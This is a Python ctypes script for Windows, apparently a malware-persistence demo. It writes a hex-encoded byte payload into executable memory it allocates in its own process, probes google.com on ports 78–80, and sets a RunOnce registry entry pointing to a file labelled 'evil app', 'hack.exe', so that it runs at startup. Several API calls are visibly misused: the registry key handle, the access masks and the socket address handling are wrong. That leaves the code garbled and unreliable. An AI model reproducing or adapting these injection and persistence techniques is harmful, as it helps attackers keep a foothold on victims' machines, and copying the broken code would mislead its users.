import ctypes
import os
import platform
import binascii

data = binascii.unhexlify("b80a000000c3")

GENERIC_ALL = 0x10000000
CREATE_NEW = 1
FILE_ATTRIBUTE_NORMAL = 0x80

ctypes.windll.kernel32.Sleep(3000)
file_handle = ctypes.windll.kernel32.CreateFileA("example.txt".encode("ascii"), GENERIC_ALL, 0, None, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, None)

# Open a handle to the process
pid = os.getpid()
hProcess = ctypes.windll.kernel32.OpenProcess(ctypes.c_int(0x1F0FFF), False, ctypes.c_int(pid))

# Allocate memory in the process for the data to be written
address = ctypes.windll.kernel32.VirtualAllocEx(hProcess, None, ctypes.c_int(len(data)), ctypes.c_int(0x1000), ctypes.c_int(0x40))

# Write the data to the memory address
ctypes.windll.kernel32.WriteProcessMemory(hProcess, address, data, ctypes.c_int(len(data)), None)

# Close the handle to the process
ctypes.windll.kernel32.CloseHandle(hProcess)

# Load the Winsock library
winsock = ctypes.windll.Ws2_32

for port in [78, 79, 80]:
    # Create a socket
    s = ctypes.c_int(0)
    s.value = winsock.socket(2, 1, 6)

    # Connect to google.com
    target = ctypes.create_string_buffer(b"google.com\0")
    address = ctypes.create_string_buffer(b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
    winsock.getaddrinfo(target, None, None, ctypes.byref(address))
    port = ctypes.c_ushort(port)
    result = winsock.connect(s, address, ctypes.sizeof(address), port)

    # Check the result of the connection
    if result == 0:
        print("Connected to google.com on port", port)
    else:
        print("Failed to connect to google.com on port", port)

    # Close the socket
    winsock.closesocket(s)


# Registry
# shell
shell = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"

# evil app
exe = "C:\\Users\\IEUser\\Desktop\\research\\2023-01-20-malware-pers-21\\hack.exe".encode('utf-8')

# open registry key
hkey = ctypes.c_void_p()
res = ctypes.windll.advapi32.RegOpenKeyExW(ctypes.c_uint32(0x8), # HKEY_LOCAL_MACHINE
    shell,
    0,
    0x00020019, # KEY_WRITE
    ctypes.byref(hkey)
)

if res == 0:
    # create sub-key
    hkR = ctypes.c_void_p()
    res = ctypes.windll.advapi32.RegCreateKeyExW(
        hkey,
        "open\\command",
        0,
        None,
        0, # REG_OPTION_NON_VOLATILE
        0x000f003f, # KEY_ALL_ACCESS
        None,
        ctypes.byref(hkR),
        None
    )

    if res == 0:
        # set registry key value
        res = ctypes.windll.advapi32.RegSetValueExW(
            hkR,
            None,
            0,
            1, # REG_SZ
            exe,
            len(exe)
        )
        ctypes.windll.advapi32.RegCloseKey(hkR)
    ctypes.windll.advapi32.RegCloseKey(hkey)
